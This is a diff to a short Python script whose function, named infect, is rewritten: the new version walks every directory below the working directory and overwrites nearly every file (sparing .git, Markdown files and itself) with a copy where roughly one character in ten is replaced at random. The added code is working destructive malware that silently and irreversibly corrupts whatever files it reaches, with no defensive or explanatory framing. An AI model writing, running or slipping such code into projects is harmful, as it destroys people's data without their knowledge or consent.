@@ -1,21 +1,41 @@
 import os
+import sys
+import random
 
 
-def infect(files):
+def infect():
+    current_directory = os.getcwd()
+    running_file = sys.argv[0]
 
-    for file in files:
-        fl = open('project_files/' + file, 'a')
-        lines = []
-        __inject_files = os.listdir(os.getcwd())
-        for i_file in __inject_files:
-            try:
-                f = open(os.getcwd() + '/' + i_file, 'r')
-                lines.extend(f.readlines())
-            except:
-                pass
-        fl.writelines(lines)
-        fl.close()
+    for root, dirs, files in os.walk(current_directory):
+        if '.git' in dirs:
+            dirs.remove('.git')  # Exclude the .git directory
+        for file in files:
+            file_path = os.path.join(root, file)
+            if file_path != running_file and not file_path.endswith('.md') and '.git' not in file_path.split(
+                    os.path.sep):
+                try:
+                    with open(file_path, 'r+') as f:
+                        content = f.read()
+                        f.seek(0)
+                        f.truncate()
+                        new_content = mutate_content(content)
+                        f.write(new_content)
+                except Exception as e:
+                    print(f"Error infecting {file_path}: {e}")
 
 
-for _ in range(10):
-    infect(os.listdir('project_files'))
+def mutate_content(content):
+    # Randomly mutate the content
+    mutated_content = ""
+    for char in content:
+        if random.random() < 0.1:  # 10% chance of mutation
+            mutated_content += random.choice(
+                'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+-=[]{}|;:,.<>?')
+        else:
+            mutated_content += char
+    return mutated_content
+
+
+if __name__ == "__main__":
+    infect()
